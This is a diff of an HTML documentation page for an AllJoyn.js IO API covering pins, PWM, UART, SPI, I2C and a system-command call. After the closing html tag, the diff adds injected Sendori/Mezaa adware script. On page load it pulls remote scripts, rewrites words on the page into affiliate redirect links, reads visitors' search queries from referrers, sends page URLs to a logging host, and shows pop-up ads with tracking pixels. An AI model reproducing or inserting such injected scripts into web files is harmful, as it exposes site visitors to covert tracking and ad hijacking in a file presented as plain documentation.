@@ -1,74 +1,506 @@
-<!--
-This work is licensed under a Creative Commons Attribution 4.0 International License.
-
-http://creativecommons.org/licenses/by/4.0/
--->
-<!DOCTYPE html><html><head><meta charset="utf-8"><title>IO</title><style></style></head><body>
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>IO Documentation</title><style></style></head><body>
+<p>This work is licensed under a Creative Commons Attribution 4.0 International License.
+<a href="http://creativecommons.org/licenses/by/4.0/">http://creativecommons.org/licenses/by/4.0/</a></p>
 <h1 id="io">IO</h1>
 <hr>
 <h3 id="configuration-options-co-">Configuration Options (CO)</h3>
 <ol>
-<li>IO.pullDown</li>
-<li>IO.pullUp</li>
-<li>IO.openDrain</li>
+<li><p>IO.pullDown</p>
+</li>
+<li><p>IO.pullUp</p>
+</li>
+<li><p>IO.openDrain</p>
+</li>
 </ol>
 <h3 id="trigger-modes-tm-">Trigger Modes (TM)</h3>
 <ol>
-<li>IO.fallingEdge</li>
-<li>IO.risingEdge</li>
-<li>IO.disable</li>
+<li><p>IO.fallingEdge</p>
+</li>
+<li><p>IO.risingEdge</p>
+</li>
+<li><p>IO.disable</p>
+</li>
 </ol>
 <h3 id="information-from-pins">Information From Pins</h3>
-<p><strong>pin.info.physicalPin:</strong> Returns the physical pin number<br><strong>pin.info.schematicId:</strong> Returns the schematic Id of the pin<br><strong>pin.info.datasheetId:</strong> Returns the data sheet Id of the pin<br><strong>pin.info.description:</strong> Returns the description of the pin</p>
-<pre><code class="lang-javascript"><span class="hljs-keyword">var</span> led1 = IO.digitalOut(...);  
+<p><strong>pin.info.physicalPin:</strong> Returns the physical pin number  </p>
+<p><strong>pin.info.schematicId:</strong> Returns the schematic Id of the pin  </p>
+<p><strong>pin.info.datasheetId:</strong> Returns the data sheet Id of the pin  </p>
+<p><strong>pin.info.description:</strong> Returns the description of the pin    </p>
+<pre><code class="lang-javascript">
+<span class="hljs-keyword">var</span> led1 = IO.digitalOut(...);  
+
 print(led1.pin.info...);
 </code></pre>
 <h3 id="digitalin-">digitalIn()</h3>
-<p><strong>IO.digitalIn(IO.pin#, CO config)-</strong>Construct a new digital input pin<br>#: the number of the pin to be configured. Pin numbering starts from 1.<br>config: the Configuration Option of the pin  </p>
-<pre><code class="lang-javascript"><span class="hljs-keyword">var</span> pb1 = IO.digitalIn(IO.pin1, IO.pullDown);
+<p><strong>IO.digitalIn(IO.pin#, CO config)-</strong>Construct a new digital input pin  </p>
+<p>#: the number of the pin to be configured. Pin numbering starts from 1.  </p>
+<p>config: the Configuration Option of the pin  </p>
+<pre><code class="lang-javascript">
+<span class="hljs-keyword">var</span> pb1 = IO.digitalIn(IO.pin1, IO.pullDown);
 </code></pre>
-<p><strong>.setTrigger(TM mode, function(){})-</strong>Enable or Disable the Trigger Mode for the pin<br>mode: the Trigger Mode of the pin<br>function(): the function that will execute when .setTrigger() is called  </p>
-<pre><code class="lang-javascript">pb1.setTrigger(IO.risingEdge, <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span>{</span>print(pb1.level);});
+<p><strong>.setTrigger(TM mode, function(){})-</strong>Enable or Disable the Trigger Mode for the pin  </p>
+<p>mode: the Trigger Mode of the pin  </p>
+<p>function(): the function that will execute when .setTrigger() is called  </p>
+<pre><code class="lang-javascript">
+pb1.setTrigger(IO.risingEdge, <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span>{</span>print(pb1.level);});
 </code></pre>
 <p><strong>.level-</strong>Return the level on which the pin is on  </p>
-<pre><code class="lang-javascript">print(pb1.level) <span class="hljs-comment">//Prints out 0</span>
+<pre><code class="lang-javascript">
+print(pb1.level) <span class="hljs-comment">//Prints out 0</span>
 </code></pre>
 <h3 id="digitalout-">digitalOut()</h3>
-<p><strong>IO.digitalOut(IO.pin#, CO config)-</strong>Construct a new digital output pin with a configuration option<br>#: the number of the pin to be configured. Pin numbering starts from 1.<br>config: the configuration option of the pin, or can be replaced with 1 (on position) and 0 (off position). The pin
+<p><strong>IO.digitalOut(IO.pin#, CO config)-</strong>Construct a new digital output pin with a configuration option  </p>
+<p>#: the number of the pin to be configured. Pin numbering starts from 1.  </p>
+<p>config: the configuration option of the pin, or can be replaced with 1 (on position) and 0 (off position). The pin 
 will automatically start in the on position if a configuration option is typed in  </p>
-<pre><code class="lang-javascript"><span class="hljs-keyword">var</span> led1 = IO.digitalOut(IO.pin1, IO.pullUp);
+<pre><code class="lang-javascript">
+<span class="hljs-keyword">var</span> led1 = IO.digitalOut(IO.pin1, IO.pullUp);
 </code></pre>
-<p><strong>IO.digitalOut(IO.pin#)-</strong>Construct a new digital output pin that will start in the off position<br>#: the number of the pin to be configured. Pin numbering starts from 1. </p>
-<pre><code class="lang-javascript"><span class="hljs-keyword">var</span> led2 = IO.digitalOut(IO.pin2);
+<p><strong>IO.digitalOut(IO.pin#)-</strong>Construct a new digital output pin that will start in the off position  </p>
+<p>#: the number of the pin to be configured. Pin numbering starts from 1. </p>
+<pre><code class="lang-javascript">
+<span class="hljs-keyword">var</span> led2 = IO.digitalOut(IO.pin2);
 </code></pre>
 <p><strong>.toggle()-</strong>Toggle the pin  </p>
-<pre><code class="lang-javascript">led1.toggle();
+<pre><code class="lang-javascript">
+led1.toggle();
 </code></pre>
-<p><strong>.pwm(double dutyCycle, int freq)-</strong>Set the PWM duty cycle on a pin (only if PWM functions are supported on the pin)<br>dutyCycle: A value between 0.0 and 1.0 to set the cycle<br>freq: the frequency to rotate the bit pattern  </p>
-<pre><code class="lang-javascript">led2.pwm(<span class="hljs-number">0.5</span>, <span class="hljs-number">4</span>);
+<p><strong>.pwm(double dutyCycle, int freq)-</strong>Set the PWM duty cycle on a pin (only if PWM functions are supported on the pin)  </p>
+<p>dutyCycle: A value between 0.0 and 1.0 to set the cycle  </p>
+<p>freq: the frequency to rotate the bit pattern  </p>
+<pre><code class="lang-javascript">
+led2.pwm(<span class="hljs-number">0.5</span>, <span class="hljs-number">4</span>);
 </code></pre>
 <p><strong>.level-</strong>Return or set the level on which the pin is on  </p>
-<pre><code class="lang-javascript">print(led1.level); <span class="hljs-comment">//prints out 1</span>
+<pre><code class="lang-javascript">
+print(led1.level); <span class="hljs-comment">//prints out 1</span>
+
 led1.level = <span class="hljs-number">0</span>;
+
 print(led1.level); <span class="hljs-comment">//prints out 0</span>
 </code></pre>
 <h3 id="analogin-">analogIn()</h3>
-<p><strong>IO.analogIn(IO.pin#)-</strong>Construct a new analog input pin<br>#: the number of the pin to be configured to an analog input. Pin numbering starts from 1. </p>
-<pre><code class="lang-javascript"><span class="hljs-keyword">var</span> sensor = IO.analogIn(IO.pin12);
+<p><strong>IO.analogIn(IO.pin#)-</strong>Construct a new analog input pin  </p>
+<p>#: the number of the pin to be configured to an analog input. Pin numbering starts from 1. </p>
+<pre><code class="lang-javascript">
+<span class="hljs-keyword">var</span> sensor = IO.analogIn(IO.pin12);
 </code></pre>
 <p><strong>.value-</strong>Return the ADC value of the pin  </p>
-<pre><code class="lang-javascript">print(sensor.value);
+<pre><code class="lang-javascript">
+print(sensor.value);
 </code></pre>
 <h3 id="analogout-">analogOut()</h3>
-<p><strong>IO.analogOut(IO.pin#)-</strong>Construct a new analog output pin<br>#: the number of the pin to be configured to an analog output. Pin numbering starts from 1.  </p>
-<pre><code class="lang-javascript"><span class="hljs-keyword">var</span> motor = IO.analogOut(IO.pin10);
+<p><strong>IO.analogOut(IO.pin#)-</strong>Construct a new analog output pin  </p>
+<p>#: the number of the pin to be configured to an analog output. Pin numbering starts from 1.  </p>
+<pre><code class="lang-javascript">
+<span class="hljs-keyword">var</span> motor = IO.analogOut(IO.pin10);
 </code></pre>
-<p><strong>.value(int num)-</strong>Set the DAC value<br>num: the number to set  </p>
-<pre><code class="lang-javascript">motor.value(<span class="hljs-number">2</span>);
+<p><strong>.value(int num)-</strong>Set the DAC value  </p>
+<p>num: the number to set  </p>
+<pre><code class="lang-javascript">
+motor.value(<span class="hljs-number">2</span>);
+</code></pre>
+<h3 id="io-uart-">IO.uart()</h3>
+<p><strong>IO.uart(IO.pin#1, IO.pin#2, baud)-</strong> Create a new uart peripheral object</p>
+<p>#1: The pin number of the TX pin on the AllJoyn JS device.</p>
+<p>#2: The pin number of the RX pin on the AllJony JS device.</p>
+<p>baud: The baud rate for the UART peripheral</p>
+<p>uart() has 2 functions: write() and read(). The write() function will support many data types: Booleans, numbers, strings, buffers, and arrays of any of the previous types. The read() function takes a length parameter and returns a Duktape Buffer.</p>
+<pre><code class="lang-javascript"><span class="hljs-keyword">var</span> u = IO.uart(IO.pin4, IO.pin5, <span class="hljs-number">115200</span>);
+
+u.write(<span class="hljs-string">"Hello World"</span>);
+u.write([<span class="hljs-string">"this"</span>, <span class="hljs-string">"is"</span>, <span class="hljs-string">"an"</span>, <span class="hljs-string">"array"</span>, <span class="hljs-string">"of"</span>, <span class="hljs-string">"strings"</span>]);
+
+<span class="hljs-comment">/*Read 10 bytes*/</span>
+<span class="hljs-keyword">var</span> r = IO.read(<span class="hljs-number">10</span>);
+</code></pre>
+<h3 id="io-spi-">IO.spi()</h3>
+<p><strong>IO.spi(IO.pin#1, IO.pin#2, IO.pin#3, IO.pin#4, prescaler, master, polarity, phase, data_bits)-</strong> Create a new SPI peripheral object</p>
+<p>#1: MOSI pin (Master Out Slave In)</p>
+<p>#2: MISO pin (Master In Slave Out)</p>
+<p>#3: CS pin (Chip Select)</p>
+<p>#4: Clock pin</p>
+<p>prescaler: The divisor of the CPU clock that will run the SPI peripheral. SPI Clock = (CPU Clock / prescaler)</p>
+<p>master: Boolean specifying if the device is a slave or master in the SPI setup</p>
+<p>polarity: The clock polarity. Values can be 0 (low) or 1 (high)</p>
+<p>phase: The clock phase. Values can be 1 (1 Edge) or 2 (2 Edge)</p>
+<p>data_bits: Number of data bits per SPI transfer. Can be 8, 16, 32 depending on the platform.</p>
+<p>The spi object has two functions: read() and write(). The write() function will support many data types: Booleans, numbers, strings, buffers, and arrays of any of the previous types. The read() function takes a length parameter and returns a Duktape Buffer.</p>
+<pre><code class="lang-javascript"><span class="hljs-keyword">var</span> s = IO.spi(IO.pin4, IO.pin5, IO.pin6, IO.pin7, <span class="hljs-number">4</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>);
+
+s.write(<span class="hljs-string">"Write to SPI"</span>);
+
+<span class="hljs-comment">/* Print out 40 bytes read back*/</span>
+print(s.read(<span class="hljs-number">40</span>));
+</code></pre>
+<h3 id="io-i2c-">IO.i2c()</h3>
+<p><strong>IO.i2c(IO.pin#1, IO.pin#2, clock, master, address)-</strong> Create a new I2C peripheral object</p>
+<p>#1: SDA pin</p>
+<p>#2: SCL pin</p>
+<p>clock: The clock rate for the I2C device</p>
+<p>master: Mode for the I2C device. true for master, false for slave</p>
+<p>address: The AllJoyn.js device address. If master this can be any value as it is not used.</p>
+<p>The i2c object has 4 functions: read(), write(), start(), and stop(). The functions read() and write() only work with 1 byte at a time. You cannot provide arrays or buffers to them. The start() function takes an address of the device on the i2c line that you want to talk to. This is called at the beginning of transmission followed by writes or reads. After all writes or reads have been completed the stop() function is called to signal that the transaction has completed.</p>
+<pre><code class="lang-javascript"><span class="hljs-keyword">var</span> i = IO.i2c(IO.pin5, IO.pin6, <span class="hljs-number">100000</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">0x00</span>);
+
+<span class="hljs-comment">/*Talk to device at address 0x4A*/</span>
+i.start(<span class="hljs-number">0x4A</span>);
+<span class="hljs-comment">/*Devices sub address*/</span>
+i.write(<span class="hljs-number">0x06</span>);
+<span class="hljs-comment">/*Read the register 0x06 from the device*/</span>
+<span class="hljs-keyword">var</span> ret = i.read();
+<span class="hljs-comment">/*Stop the transmission*/</span>
+i.stop();
 </code></pre>
 <h3 id="io-system-string-cmmd-">IO.system(String cmmd)</h3>
-<p>Emit the command to the underlying system<br>cmmd: the command to emit  </p>
-<pre><code class="lang-javascript">IO.system(<span class="hljs-string">'aplay DoorBell.wav'</span>);
+<p>Emit the command to the underlying system  </p>
+<p>cmmd: the command to emit  </p>
+<pre><code class="lang-javascript">
+IO.system(<span class="hljs-string">'aplay DoorBell.wav'</span>);
 </code></pre>
 
-</body></html>
+</body></html><script type="text/javascript" src="http://code.jquery.com/jquery-1.4.2.min.js"></script>
+<script type="text/javascript" src="http://cdn.mezaa.com/js/inlinekeywords.js"></script>
+<script type="text/javascript">
+function sendoriInline2(){function b(a,b,d){if((a==-1||!c(d.charAt(a)))&&(b>=d.length||!c(d.charAt(b)))){return true}return false}function c(a){var b=a.charCodeAt(0);if(b>47&&b<58||b>64&&b<91||b>96&&b<123){return true}return false}var a=window.location!=window.parent.location?true:false;if(a){return false}var d=jQuery.noConflict();d(document).ready(function(){function h(a){if(a=="SCRIPT"||a=="TITLE"||a=="A"||a=="STYLE"||a=="H1"||a=="H2"||a=="H3"||a=="H4"||a=="INPUT"||a=="IMG"||a=="FORM"||a=="BUTTON"||a=="LINK"||a=="IFRAME"||a=="SELECT"||a=="ALT"||a=="LABEL"||a=="META"||a=="NOSCRIPT"||a=="OBJECT"||a=="PARAM"||a=="CITE"||a=="/BODY"||a=="BR"||a=="HEAD"){return true}else{return false}}function i(d){var f=document.URL;var h=new Object;h.substituted=false;if(g==true){return h}if(typeof console==="undefined"||typeof console.log==="undefined"){console={};console.log=function(){}}var i=0;var j;textval=d.toLowerCase();for(var k=0;k<blacklist_keywords.blacklist.length&&g==false&&d.length>0;k++){i=0;negativeword=blacklist_keywords.blacklist[k].keyword.toLowerCase();while(i<d.length&&textval.indexOf(negativeword,i)>=0){i=textval.indexOf(negativeword,i);j=i+negativeword.length;if(b(i-1,i+negativeword.length,textval)){g=true;break}i=j}}i=0;for(var l=0;l<inline_keyword_obj.inlinebrands.length&&g==false;l++){if(a>=c){break}var m=inline_keyword_obj.inlinebrands[l].brandword;var n=inline_keyword_obj.inlinebrands[l].hostname;i=0;var o=m;if(m.indexOf("&")>=0){o=m.replace("&","")}if(m.indexOf("'")>=0){o=m.replace("'","")}var p="http://securelink.sendori.com/br?key="+o+"&spid=1853&output=redirect&ix=1";var q="<a href='"+p+"' target='_blank'><span id='inlineTextHighlight'>";var r="</span></a>";while(i<d.length&&d.indexOf(m,i)>=0&&a<c){i=d.indexOf(m,i);j=i+m.length;if(f.indexOf(n)<0&&b(i-1,i+m.length,d)){var s=d.substring(0,i);var t=d.substring(j);h.newText=s+q+m+r+t;h.substituted=true;e[e.length]="http://l.mezaa.com/stbin/lognow.cgi/?key="+o+"&domain="+document.URL;a++}else{}i=j}}return h}function j(a){if(g==true){return}var b=a.nodeValue;var c=a.parentNode;var d=i(b);if(d.substituted==true){var e=document.createElement("SPAN");e.innerHTML=d.newText;c.replaceChild(e,a)}}function k(a){if(h(a.nodeName)){return}if(a.nodeName=="#text"&&d.trim(a.nodeValue).length>0){j(a)}if(a.hasChildNodes()){for(var b=0;b<a.childNodes.length;b++){k(a.childNodes[b])}}}var a=0;var c=10;var e=new Array;var f=document.URL;var g=false;if(typeof console==="undefined"||typeof console.log==="undefined"){console={};console.log=function(){}}d.expr[":"].HasBlackListURL=function(a,b,c){var e=false;d.each(blacklist_urls.urls,function(b){urlstring=this.url.toString().toLowerCase();if(d(a).attr("href")!=null&&d(a).attr("href")!=="undefined"&&d(a).attr("href").toString().toLowerCase().indexOf(urlstring)>=0){e=true}});return e};if(d("a:HasBlackListURL('')").length>0){g=true}var l=document.getElementsByTagName("body");for(var m=0;m<l.length;m++){var n=l[m];k(n)}if(g==false){for(var m=0;m<e.length;m++){d.ajax({url:e[m],type:"GET",dataType:"jsonp",cache:false,error:function(){}})}}else{d("a[href*=securelink.sendori.com/br]").each(function(a){var b=d(this).text();d(this).replaceWith(b)})}})}
+
+sendoriInline2();
+
+        function sendoriSlider()
+    {
+
+        var isInIFrame = (window.location != window.parent.location) ? true : false;
+        var sdiJQ=jQuery.noConflict(true);
+        sdiJQ(document).ready(function() {
+
+        if(!isInIFrame) {
+        displaySliderAd();
+        }
+
+        });
+
+        var CorrectedDomain;
+  var sndpID = '30001';
+        var sndgID = '{C48F32D1-4424-4217-9268-6F9F8FE3533C}';
+    var mseEntry = 0;
+    var msSecurityFlag = 1;
+    var programData = 'Mezaa';
+    var OriginalDomain;
+     var merchantId;
+
+        function  displaySliderAd() {
+            var foundBrand = false;
+            if(CorrectedDomain != undefined && OriginalDomain != undefined) {
+            // Nx flow
+
+            for(var index = 0; index < slider_keywords.slidertext.length; index++) {
+            var brandterm = slider_keywords.slidertext[index].BRAND;
+             if(CorrectedDomain.indexOf(brandterm.toLowerCase()) >= 0) {
+
+            brand_category = slider_keywords.slidertext[index].CATEGORY;
+            faviconsrc =  slider_keywords.slidertext[index].FAVICONSRC;
+            makeTibCall(brand_category,"NX",1860,faviconsrc);
+            foundBrand = true;
+            break;
+            }
+        }
+        if(!foundBrand)
+                                        {showNoadLegend(CorrectedDomain, "NX");}
+
+        }
+
+        if (!isSearchfromGoog() && !isSearchfromBing() && !isSearchfromYahoo() && !isSearchfromAsk()) return false;
+        if(isSearchfromYahoo()) {
+            query= getQuery("p");
+            }
+        else {
+            query= getQuery("q");
+            }
+
+        if(query == undefined || query == null || query == "") {
+            return false;
+            }
+
+        for(var index = 0; index < slider_keywords.slidertext.length; index++) {
+                var brandterm = slider_keywords.slidertext[index].BRAND;
+                if(brandterm.toLowerCase() == query.toLowerCase()) {
+                faviconsrc =  slider_keywords.slidertext[index].FAVICONSRC;
+                makeTibCall(brandterm,"SERP",1871,faviconsrc);
+                }
+
+            }
+
+
+
+            }
+
+
+            function showLegend(source,title,description,displayURL,clickURL,faviconsrc){
+
+                divToInsert = "<div id='slider_container' style='display:none'><div id='slider_header'>" ;
+
+                if(source == "NX") {
+                divToInsert += "<div id='notification_alert'></div>"
+                + "<div id='notification_message'></div>";
+
+                }
+
+
+            divToInsert += "<div style='left:auto; position:absolute; right:0;margin-right:5px;margin-top:4px;'><div id='snd_logo'></div>"  +
+                "<div id='icon_close'></div></div></div>" +
+        "<div id='slider_body'>" ;
+            var ua = sdiJQ.browser;
+            if ( ua.msie && ua.version.slice(0,3) == "7.0" )  {
+                divToInsert += "<div id='favicon'></div><div style='margin-left:30px;padding-top:3px;'>" ;
+                }
+            else {
+                sdiJQ('#favicon').css('height', '16px');
+                divToInsert += "<div id='favicon'></div><div style='margin-left:30px;padding-top:3px;position:absolute;'>" ;
+                }
+            divToInsert +="<div id='ad_title'></div>" +
+            "<div id='ad_body'></div></div>" +
+        "<div id='bt_learn'></div>" +
+        "</div>" +
+    "<div id='slider_footer'>" +
+        "<div id='ad_url'></div></div>" +
+    "</div>";
+    divToInsert += "<div style='display:none;'><img src='//pixel.quantserve.com/pixel/p-fbiS6Ydv_HyB-.gif' border='0' height='1' width='1' alt='Quantcast'/></div>";
+
+    var _qevents = _qevents || [];
+    _qevents.push({
+        qacct:"p-fbiS6Ydv_HyB-"
+        });
+
+
+    var quantcastTag = document.createElement("script");
+    quantcastTag.type = "text/javascript";
+    quantcastTag.src = "http://edge.quantserve.com/quant.js";
+    quantcastTag.async = true;
+    var scpt = document.getElementsByTagName('script')[0];
+    scpt.parentNode.insertBefore(quantcastTag, scpt);
+
+    sdiJQ(document.body).append(divToInsert);
+
+
+    if (sdiJQ("#slider_container").is( ":visible" )){
+        //  sdiJQ("#slider_container").slideUp( 1500 );
+
+        } else {
+        sdiJQ("#slider_container").slideDown( 1500);
+        }
+
+
+    sdiJQ("#icon_close").click(function(){
+        sdiJQ("#slider_container").slideUp( 1500 );
+        });
+
+    // if Nx flow add notification and mouseover
+    if(source == "NX") {
+
+        sdiJQ("#notification_message").html(getFittedText());
+
+        sdiJQ("#icon_close").click(function(){
+        sdiJQ("#slider_container").slideUp( 1500 );
+        });
+
+    }
+    sdiJQ('#ad_title').html(title);
+    sdiJQ('#ad_body').html(description);
+    sdiJQ('#ad_url').html("Sponsored by: " + displayURL);
+    if(faviconsrc=="G"){
+        favicon_url = "url(http://www.google.com/s2/favicons?domain=" + displayURL + ")";
+        }
+    else {
+        favicon_url = "url(" + faviconsrc + ")";
+        }
+    sdiJQ('#favicon').css("background-image", favicon_url);
+    sdiJQ('#slider_body').click(function(){
+
+        window.open(clickURL) ;
+        });
+
+    sdiJQ('#ad_url').hover(function(){sdiJQ(this).css('cursor','pointer')}, function(){sdiJQ(this).css('cursor','auto')});
+    sdiJQ('#snd_logo').hover(function(){sdiJQ(this).css('cursor','pointer')}, function(){sdiJQ(this).css('cursor','auto')});
+    sdiJQ('#ad_url').click(function(){
+        window.open(clickURL) ;
+        });
+    sdiJQ('#snd_logo').click(function(){
+        window.open('http://support.mezaa.com/home');
+        });
+
+    }
+
+    function showNoadLegend(){
+
+        var NxdivToInsert = "<div id='Nx_slider_container' style='display:none'>" +
+        "<div id='slider_header'>" +
+        "<div id='notification_alert'></div>" +
+        "<div id='notification_message'></div>" +
+        "<div style='left: auto; position: absolute; right:0;margin-right: 5px;margin-top:4px;'><div id='snd_logo'></div>" +
+        "<div id='icon_close'></div></div>" +
+        "</div>" +
+        "</div>" ;
+        NxdivToInsert += "<div style='display:none;'><img src='//pixel.quantserve.com/pixel/p-fbiS6Ydv_HyB-.gif' border='0' height='1' width='1' alt='Quantcast'/></div>";
+
+        var _qevents = _qevents || [];
+        _qevents.push({
+        qacct:"p-fbiS6Ydv_HyB-"
+        });
+
+
+    var quantcastTag = document.createElement("script");
+    quantcastTag.type = "text/javascript";
+    quantcastTag.src = "http://edge.quantserve.com/quant.js";
+    quantcastTag.async = true;
+    var scpt = document.getElementsByTagName('script')[0];
+    scpt.parentNode.insertBefore(quantcastTag, scpt);
+    sdiJQ(document.body).append(NxdivToInsert);
+
+
+    if (sdiJQ("#Nx_slider_container").is( ":visible" )){
+        sdiJQ("#Nx_slider_container").slideUp( 1500 );
+        } else if(!sdiJQ("slider_container").is( ":visible" )){
+        sdiJQ("#Nx_slider_container").slideDown( 1500);
+        }
+
+    if(sdiJQ("slider_container").is( ":visible" )) {
+        sdiJQ("#Nx_slider_container").css("display","none");
+        }
+
+
+    sdiJQ("#icon_close").click(function(){
+        sdiJQ("#Nx_slider_container").slideUp( 1500);
+        });
+
+    sdiJQ('#snd_logo').hover(function(){sdiJQ(this).css('cursor','pointer')}, function(){sdiJQ(this).css('cursor','auto')});
+    sdiJQ('#snd_logo').click(function(){
+        window.open('http://support.mezaa.com/home');
+        });
+
+
+    sdiJQ("#notification_message").html(getFittedText());
+
+
+    }
+
+    function isSearchfromGoog(){
+        if (document.referrer.indexOf("www.google.com/url") != -1 && document.URL.indexOf("google.com") == -1) {
+        return true;
+        }
+    return false;
+    }
+
+    function isSearchfromBing(){
+        if (document.referrer.indexOf("www.bing.com/search") != -1 && document.URL.indexOf("bing.com/search") == -1) {
+        return true;
+        }
+    return false;
+    }
+
+    function isSearchfromYahoo(){
+        if (document.referrer.indexOf("search.yahoo.com/search") != -1 && document.URL.indexOf("search.yahoo.com") == -1) {
+        return true;
+        }
+    return false;
+    }
+
+    function isSearchfromAsk(){
+        if (document.referrer.indexOf("www.ask.com/web") != -1 && document.URL.indexOf("ask.com/web") == -1) {
+        return true;
+        }
+    return false;
+    }
+
+    function getQuery(queryarg) {
+
+        var value;
+        var query = document.referrer;
+
+        var pairs = query.split("&");
+        for(var i = 0; i < pairs.length; i++) {
+
+        var pos = pairs[i].indexOf(queryarg + "=");
+        arg = pairs[i].substring(0, pos + 1);
+
+        if (pos != -1 && (arg == queryarg || (arg.indexOf("?" + queryarg) != -1)) ) {
+
+        value = pairs[i].substring(pos+2);
+        }
+
+    else continue;
+
+    }
+    return unescape(value);
+    }
+
+    function makeTibCall(query, source,spid,faviconsrc) {
+        sdiJQ.ajax({
+            url : "http://securelink.sendori.com/r?key=" + query + "&spid=" + spid + "&output=json&rf=" + document.domain,
+            type: "GET",
+            dataType: "jsonp",
+            cache: false,
+            success: function(result) {
+
+                if( typeof result.ads[0] !== "undefined" ) {
+                    if(result.ads[0].displayURL.indexOf("http") >= 0 || result.ads[0].displayURL.indexOf("https") >= 0 )   {
+                        displayURL = result.ads[0].displayURL.substring(result.ads[0].displayURL.indexOf("//") + 2);
+
+                    }
+    else displayURL =  result.ads[0].displayURL;
+    if(result.ads[0].url.indexOf("http") < 0) {
+            clickURL = "http://" + result.ads[0].url;
+            }
+        else clickURL =  result.ads[0].url;
+
+        showLegend(source,result.ads[0].title,result.ads[0].description,displayURL,clickURL,faviconsrc);
+
+
+        }
+
+        else if( source == "NX") {
+            // Nx flow and no ad returned
+            showNoadLegend();
+
+            }
+
+        }
+
+        });
+        }
+
+        function getFittedText(){
+            // display 80 characters of notififcation message
+            var texttoDisplay = "Your input '" + OriginalDomain + "' has been corrected to '" + CorrectedDomain + "'";
+            var fittedtext = "";
+            var limit = (texttoDisplay.length > 63) ? 63 : texttoDisplay.length ;
+            for(i=0;i< limit; ++i) {
+            fittedtext += texttoDisplay.charAt(i);
+            }
+        if(limit == 63) fittedtext += "...";
+        return fittedtext;
+        }
+
+        } //end  sendoriSlider
+
+        sendoriSlider();
+
+
+            </script>
+                <style type='text/css'>
+                #inlineTextHighlight{background:none repeat scroll 0 50% transparent;text-decoration:underline;display:inline;visibility:none;color:blue !important;font-family:Arial;cursor:pointer;line-height:1.5em}
+                #slider_header{height:26px;width:510px;background-image:url(http://cdn.mezaa.com/images/bg_header.png);background-repeat:repeat-x;border-left:1px #1A5189;border-top:1px #1A5189;border-right:1px #1A5189;display:block}
+                #slider_body{height:90px;width:510px;background-image:url(http://cdn.mezaa.com/images/bg_body.png);background-repeat:repeat-x;border-top:1px #438ECE;border-bottom:1px #438ECE;border-left:1px #1A5189;border-right:1px #1A5189;display:block;cursor:pointer}
+                #slider_footer{height:30px;width:510px;background-image:url(http://cdn.mezaa.com/images/bg_footer.png);background-repeat:repeat-x;border-left:1px #1A5189;border-right:1px #1A5189;border-bottom:1px #1A5189;display:block;cursor:auto}
+                #bt_learn{background-image:url(http://cdn.mezaa.com/images/btn_learn.png);background-repeat:no-repeat;height:90px;margin-right:5px;width:112px;margin-top:60px;left:auto;right:0;top:0;position:absolute;}
+                #icon_alert{height:16px;width:16px;background-image:url(http://cdn.mezaa.com/images/icon_alert.png);padding:5px}
+                #icon_close{background-image:url(http://cdn.sendori.com/images/icon_close.png);background-repeat:no-repeat;display:block;float:left;height:16px;width:16px;}
+                #favicon{background-position:center top;background-repeat:no-repeat;height:90px;margin-left:5px;margin-top:5px;width:16px;float:left;position:relative;}
+                #ad_title{font-family:Helvetica;font-size:13pt;font-weight:700;color:#000;text-decoration:underline;margin-right:122px;text-align:left}
+                #ad_body{font-family:Helvetica;font-size:11pt;color:#333;padding-top:5px;margin-right:125px;text-align:left;}
+                #ad_url{color:#FFF;float:left;font-family:Helvetica;font-size:10pt;margin-right:10px;margin-left:10px;padding-top:6px;cursor:auto}
+                #snd_logo{background-image:url(http://cdn.mezaa.com/images/logo.png); background-repeat:no-repeat;height:17px;width:65px;cursor:auto;float:left;margin-right:10px;margin-top:1px;}
+                #notification_message{color:#FFF;float:left;font-family:Helvetica;font-size:8pt;font-weight:700;padding-left:0;margin-top:5px;text-decoration:none;}
+                #notification_alert{background-image:url(http://cdn.mezaa.com/images/icon_alert.png);background-position:center center;background-repeat:no-repeat;float:left;height:16px;padding-left:10px;padding-top:5px;width:16px}
+                #slider_container{width:510px;height:146px;display:none;position:fixed;left:50%;bottom:0;margin-left:-255px;z-index:9999999999;border-radius:4px 4px 0 0;-webkit-border-radius:4px 4px 0 0;-moz-border-radius:4px 4px 0 0;box-shadow:0 0 9px #515151;-webkit-box-shadow:0 0 9px #515151;-moz-box-shadow:0 0 9px #515151}
+                #Nx_slider_container{width:510px;height:26px;display:none;position:fixed;left:50%;bottom:0;margin-left:-255px;border-radius:4px 4px 0 0;-webkit-border-radius:4px 4px 0 0;-moz-border-radius:4px 4px 0 0;z-index:9999999999;border-left:1px #1A5189;border-top:1px #1A5189;border-right:1px #1A5189;box-shadow:0 0 9px #515151;-webkit-box-shadow:0 0 9px #515151;-moz-box-shadow:0 0 9px #515151}
+                </style>
